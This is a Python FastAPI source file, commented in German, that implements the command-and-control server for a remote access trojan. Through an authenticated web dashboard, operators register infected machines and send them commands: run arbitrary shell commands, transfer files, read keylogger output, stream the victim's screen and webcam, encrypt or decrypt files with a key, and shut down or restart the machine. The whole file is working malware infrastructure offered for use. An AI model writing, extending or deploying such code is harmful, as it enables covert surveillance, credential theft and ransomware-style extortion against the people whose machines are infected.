import asyncio
import json
import base64
import os
import secrets
import logging
import websockets
import time

import uvicorn
from fastapi import (
    FastAPI,
    WebSocket,
    WebSocketDisconnect,
    Depends,
    HTTPException,
    status,
    Request,
)
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
import jwt
from datetime import datetime, timedelta


# --- Globale Variablen & App-Initialisierung ---
RAT_CLIENTS = {}  # client_id: websocket
CLIENT_COUNTER = 1
WEB_UI_SOCKETS = set()  # Unterstützt mehrere Web-UIs
CLIENT_INFOS = {}  # client_id: {hostname, os, ip, last_seen}
CLIENT_LAST_PING = {}  # client_id: timestamp
app = FastAPI()

# --- Basic Auth Konfiguration ---
security = HTTPBasic()
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "supersecretpassword123")

# --- JWT Konfiguration ---
JWT_SECRET = os.getenv("JWT_SECRET", "ratsecretjwt")
JWT_ALGO = "HS256"
JWT_EXP_MINUTES = 120

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

CLIENT_TIMEOUT = 300  # Sekunden


# --- AUTH-FUNKTION FÜR NORMALE HTTP-ROUTEN ---
async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)):
    correct_username = secrets.compare_digest(
        credentials.username, ADMIN_USERNAME
    )
    correct_password = secrets.compare_digest(
        credentials.password, ADMIN_PASSWORD
    )
    if not (correct_username and correct_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Falsche Anmeldeinformationen",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials.username


# --- JWT Funktionen ---
def create_jwt_token(username: str):
    payload = {
        "sub": username,
        "exp": datetime.utcnow() + timedelta(minutes=JWT_EXP_MINUTES)
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGO)

def verify_jwt_token(token: str):
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO])
        return payload.get("sub")
    except Exception:
        return None


# --- Web-UI Endpunkte ---
@app.post("/login")
async def login(request: Request):
    data = await request.json()
    username = data.get("username")
    password = data.get("password")
    if not username or not password:
        return JSONResponse({"error": "Benutzername und Passwort erforderlich"}, status_code=400)
    if (
        secrets.compare_digest(username, ADMIN_USERNAME)
        and secrets.compare_digest(password, ADMIN_PASSWORD)
    ):
        token = create_jwt_token(username)
        return {"token": token}
    return JSONResponse({"error": "Login fehlgeschlagen"}, status_code=401)

@app.get("/", response_class=HTMLResponse)
async def get_index(request: Request):
    token = request.query_params.get("token") or request.cookies.get("rat_token")
    if not token or not verify_jwt_token(token):
        # Zeige immer index.html, die UI prüft das Login selbst
        return FileResponse("index.html")
    return FileResponse("index.html")


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    # Token aus Query-Parameter prüfen
    token = websocket.query_params.get("token")
    if not token or not verify_jwt_token(token):
        await websocket.close(code=4401)
        return
    await websocket.accept()
    WEB_UI_SOCKETS.add(websocket)
    logging.info("Web-UI verbunden.")
    await send_client_list()
    last_ping = time.time()
    try:
        while True:
            try:
                data = await asyncio.wait_for(websocket.receive_json(), timeout=180)
            except asyncio.TimeoutError:
                logging.warning("[Web-UI] Timeout, Verbindung wird geschlossen.")
                await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Web-UI Timeout, Verbindung geschlossen."})
                break
            except Exception as e:
                if isinstance(e, WebSocketDisconnect) or getattr(e, "code", None) == 1006:
                    logging.warning("[Web-UI] Verbindung wurde abgebrochen (Upload/Disconnect).")
                    await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Web-UI Verbindung wurde abgebrochen (Upload/Disconnect)."})
                    break
                logging.error(f"[Web-UI] Fehler: {e}")
                await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Web-UI Fehler: {e}"})
                break

            # --- Heartbeat/Ping ---
            if data.get("type") == "ping":
                last_ping = time.time()
                await websocket.send_json({"type": "pong"})
                continue

            # --- Chunked Upload Handling ---
            if data.get("action") == "upload_chunk":
                target_id = data.get("target_id")
                try:
                    target_id_int = int(target_id)
                except Exception:
                    await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
                    continue
                if target_id_int not in RAT_CLIENTS:
                    await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
                    continue
                target_ws = RAT_CLIENTS[target_id_int]
                payload = dict(data)
                payload["client_id"] = str(target_id_int)
                await target_ws.send_json(payload)
                await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Chunk {data.get('chunk_index', '?')+1}/{data.get('total_chunks', '?')} an Client {target_id_int} gesendet."})
                continue
            # --- Client-Liste explizit anfordern ---
            if data.get("action") == "get_clients":
                await send_client_list()
                continue

            # --- Screenstream/Control Weiterleitung ---
            if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control', 'scan_cameras', 'webcam_start', 'webcam_stop'):
                target = data.get('target_id') or data.get('client_id')
                try:
                    target_int = int(target)
                except Exception:
                    await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Ungültige Client-ID: {target}"})
                    continue
                if target_int in RAT_CLIENTS:
                    payload = dict(data)
                    payload["client_id"] = str(target_int)
                    await RAT_CLIENTS[target_int].send_json(payload)
                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Screenstream/Control an Client {target_int} weitergeleitet."})
                else:
                    await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {target} nicht verbunden."})
                continue
            # --- Standard-Kommandos ---
            action = data.get("action")
            target_id = data.get("target_id")
            try:
                target_id_int = int(target_id)
            except Exception:
                await send_to_web_ui(
                    {"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."}
                )
                await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Client nicht gefunden für Befehl."})
                continue
            if target_id_int not in RAT_CLIENTS:
                await send_to_web_ui(
                    {"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."}
                )
                await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Client nicht gefunden für Befehl."})
                continue
            target_ws = RAT_CLIENTS[target_id_int]
            payload = {"action": action, "client_id": str(target_id_int)}
            if action == "exec":
                payload["command"] = data.get("command")
            elif action == "download":
                payload["path"] = data.get("path")
            elif action == "upload":
                payload["filename"] = data.get("filename")
                payload["data"] = data.get("data")
            elif action == "ls":
                payload["path"] = data.get("path")
            elif action == "history":
                payload["limit"] = data.get("limit")
            elif action == "keylogger":
                payload["count"] = data.get("count")
            elif action == "cd":
                payload["path"] = data.get("path")
            elif action == "encrypt":
                payload["path"] = data.get("path")
            elif action == "decrypt":
                payload["path"] = data.get("path")
                payload["key_hex"] = data.get("key_hex")
            elif action in ("systeminfo", "shutdown", "restart", "screenshot", "screenstream_start", "screenstream_stop"):
                pass
            try:
                await target_ws.send_json(payload)
                await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Befehl '{action}' an Client {target_id_int} gesendet."})
            except Exception as e:
                await send_to_web_ui(
                    {"type": "error", "message": f"Verbindung zu Client {target_id_int} verloren."}
                )
                await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Senden an Client {target_id_int}: {e}"})
    except WebSocketDisconnect:
        logging.warning("Web-UI hat die Verbindung getrennt.")
        if websocket in WEB_UI_SOCKETS:
            WEB_UI_SOCKETS.remove(websocket)
        await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Web-UI hat die Verbindung getrennt."})

# --- Hilfsfunktion: Sende aktuelle Client-Liste ---
async def send_client_list():
    try:
        clients = [
            {
                "id": str(cid),
                "hostname": CLIENT_INFOS.get(cid, {}).get("hostname", f"Client {cid}"),
                "address": getattr(ws, 'remote_address', 'unknown'),
                "os": CLIENT_INFOS.get(cid, {}).get("os", ""),
                "ip": CLIENT_INFOS.get(cid, {}).get("ip", ""),
                "last_seen": CLIENT_INFOS.get(cid, {}).get("last_seen", 0),
            }
            for cid, ws in RAT_CLIENTS.items()
        ]
        await send_to_web_ui({"type": "client_list", "clients": clients})
    except Exception as e:
        logging.error(f"Fehler beim Senden der Client-Liste: {e}")

# --- RAT-Client WebSocket Endpunkt ---
@app.websocket("/rat")
async def rat_client_endpoint(websocket: WebSocket):
    global CLIENT_COUNTER
    await websocket.accept()
    client_id = CLIENT_COUNTER
    CLIENT_COUNTER += 1
    RAT_CLIENTS[client_id] = websocket
    client_host = websocket.client.host if websocket.client else "unknown"
    client_port = websocket.client.port if websocket.client else 0
    remote_address = (client_host, client_port)
    websocket.remote_address = remote_address
    last_ping = time.time()
    try:
        await websocket.send_json({"action": "systeminfo"})
        sysinfo_data = await asyncio.wait_for(websocket.receive_json(), timeout=5)
        hostname = extract_hostname_from_sysinfo(sysinfo_data.get("output", ""))
        os_name = extract_os_from_sysinfo(sysinfo_data.get("output", ""))
        ip = extract_ip_from_sysinfo(sysinfo_data.get("output", ""))
        # Fallbacks falls leer
        if not hostname:
            hostname = sysinfo_data.get("hostname", f"Client {client_id}")
        if not os_name:
            os_name = sysinfo_data.get("os", "")
        if not ip:
            ip = sysinfo_data.get("ip", "")
    except Exception as e:
        logging.warning(f"Fehler beim Empfangen von Systeminfos: {e}")
        hostname = f"Client {client_id}"
        os_name = ""
        ip = ""
    CLIENT_INFOS[client_id] = {
        "hostname": hostname,
        "os": os_name,
        "ip": ip,
        "last_seen": time.time(),
    }
    logging.info(f"[+] Neuer RAT-Client verbunden: {hostname} ({remote_address})")
    await send_to_web_ui(
        {
            "type": "client_connected",
            "client": {
                "id": str(client_id),
                "hostname": hostname,
                "address": remote_address,
                "os": os_name,
                "ip": ip,
            },
        }
    )
    await send_client_list()
    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Neuer Client {hostname} ({client_id}) verbunden."})

    try:
        screen_meta = None
        while True:
            try:
                data = await asyncio.wait_for(websocket.receive(), timeout=180)
            except asyncio.TimeoutError:
                logging.warning(f"[Client {client_id}] Timeout, Verbindung wird geschlossen.")
                await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {client_id} Timeout, Verbindung geschlossen."})
                break
            except Exception as e:
                logging.error(f"Fehler im Client-Handler (Client {client_id}): {e}")
                break
            if data["type"] == "websocket.receive":
                if "text" in data and data["text"]:
                    try:
                        meta = json.loads(data["text"])
                        if meta.get("type") == "ping":
                            CLIENT_INFOS[client_id]["last_seen"] = time.time()
                            continue
                        # Webcam-Stream: Meta-Frame
                        if meta.get("action") == "webcam_frame":
                            # Sende Meta-Frame an Web-UI, dann erwarte base64-Frame als Text
                            await send_to_web_ui(meta)
                            # Nächstes Frame (base64) empfangen
                            img_data = await asyncio.wait_for(websocket.receive(), timeout=5)
                            if img_data["type"] == "websocket.receive" and "text" in img_data and img_data["text"]:
                                await send_to_web_ui({
                                    "action": "webcam_frame",
                                    "client_id": str(client_id),
                                    "img_base64": img_data["text"]
                                })
                            continue
                        # Screenstream-Frame: Meta
                        if meta.get("action") == "screen_frame":
                            screen_meta = meta
                            continue
                        # Standard-Kommandos
                        meta["client_id"] = str(client_id)
                        await send_to_web_ui(meta)
                        await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Nachricht von Client {client_id}: {meta.get('action')}"})
                    except Exception as e:
                        await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Parsen von Client {client_id}: {e}"})
    except WebSocketDisconnect:
        logging.warning(f"[-] RAT-Client {client_id} ({CLIENT_INFOS.get(client_id, {}).get('hostname', client_id)}) hat die Verbindung getrennt.")
        await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {client_id} hat die Verbindung getrennt."})
    finally:
        if client_id in RAT_CLIENTS:
            del RAT_CLIENTS[client_id]
        if client_id in CLIENT_INFOS:
            del CLIENT_INFOS[client_id]
        await send_to_web_ui({"type": "client_disconnected", "client_id": str(client_id)})
        await send_client_list()

# --- Hilfsfunktionen zum Extrahieren von Infos ---
def extract_hostname_from_sysinfo(sysinfo: str) -> str:
    for line in sysinfo.splitlines():
        if line.lower().startswith("hostname:") or line.lower().startswith("host:"):
            return line.split(":", 1)[1].strip()
    return ""

def extract_os_from_sysinfo(sysinfo: str) -> str:
    for line in sysinfo.splitlines():
        if line.lower().startswith("os:"):
            return line.split(":", 1)[1].strip()
    return ""

def extract_ip_from_sysinfo(sysinfo: str) -> str:
    for line in sysinfo.splitlines():
        if "öffentliche ip" in line.lower() or "public ip" in line.lower():
            return line.split(":", 1)[1].strip()
    return ""

# --- Hilfsfunktion ---
async def send_to_web_ui(data: dict):
    # Sende an alle verbundenen Web-UIs
    for ws in list(WEB_UI_SOCKETS):
        try:
            await ws.send_json(data)
        except Exception:
            try:
                WEB_UI_SOCKETS.remove(ws)
            except Exception:
                pass


# --- Hintergrundtask: Entferne inaktive Clients ---
async def cleanup_inactive_clients():
    while True:
        now = time.time()
        to_remove = []
        for cid, info in list(CLIENT_INFOS.items()):
            if now - info.get("last_seen", now) > CLIENT_TIMEOUT:
                to_remove.append(cid)
        for cid in to_remove:
            logging.warning(f"Entferne inaktiven Client {cid}")
            if cid in RAT_CLIENTS:
                try:
                    await RAT_CLIENTS[cid].close()
                except Exception:
                    pass
                del RAT_CLIENTS[cid]
            del CLIENT_INFOS[cid]
            await send_to_web_ui({"type": "client_disconnected", "client_id": str(cid)})
            await send_client_list()
        await asyncio.sleep(60)


if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    loop = asyncio.get_event_loop()
    loop.create_task(cleanup_inactive_clients())
    uvicorn.run(app, host="0.0.0.0", port=port)